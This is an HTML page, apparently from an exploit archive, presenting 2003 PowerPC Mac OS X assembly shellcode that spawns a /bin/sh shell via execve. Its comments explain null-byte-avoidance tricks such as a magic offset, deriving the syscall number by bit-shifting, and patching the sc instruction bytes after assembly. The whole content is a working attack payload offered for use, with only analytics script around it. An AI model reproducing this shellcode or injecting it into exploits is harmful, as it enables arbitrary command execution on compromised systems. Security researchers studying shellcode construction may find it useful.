<html><head><title>Osx/ppc - shellcode execve(/bin/sh)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
;;; $Id: ppc-execve.s,v 1.1 2003/03/01 01:10:48 ghandi Exp $
;;; PPC MacOS X (maybe others) shellcode
;;;
;;; After assembly, change bytes 2 and 3 of the 'sc' instruction encoding
;;; from 0x00 to 0xff.
;;;
;;; ghandi &lt; ghandi@mindless.com &gt;
;;;
	
.globl _execve_binsh
.text
_execve_binsh:
    	;; Don't branch, but do link.  This gives us the location of
	;; our code.  Move the address into GPR 31.
	xor.	r5, r5, r5	; r5 = NULL
	bnel	_execve_binsh
	mflr	r31

	;; Use the magic offset constant 268 because it makes the
        ;; instruction encodings null-byte free.
	addi	r31, r31, 268+36
	addi	r3, r31, -268	; r3 = path

        ;; Create argv[] = {path, 0} in the &quot;red zone&quot; on the stack
	stw	r3, -8(r1)	; argv[0] = path
	stw	r5, -4(r1)	; argv[1] = NULL
	subi	r4, r1, 8	; r4 = {path, 0}

	;; 59 = 30209 &gt;&gt; 9    (trick to avoid null-bytes)
	li	r30, 30209 
	srawi	r0, r30, 9	; r0 = 59
	sc			; execve(path, argv, NULL)
path:   .asciz &quot;/bin/sh&quot;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
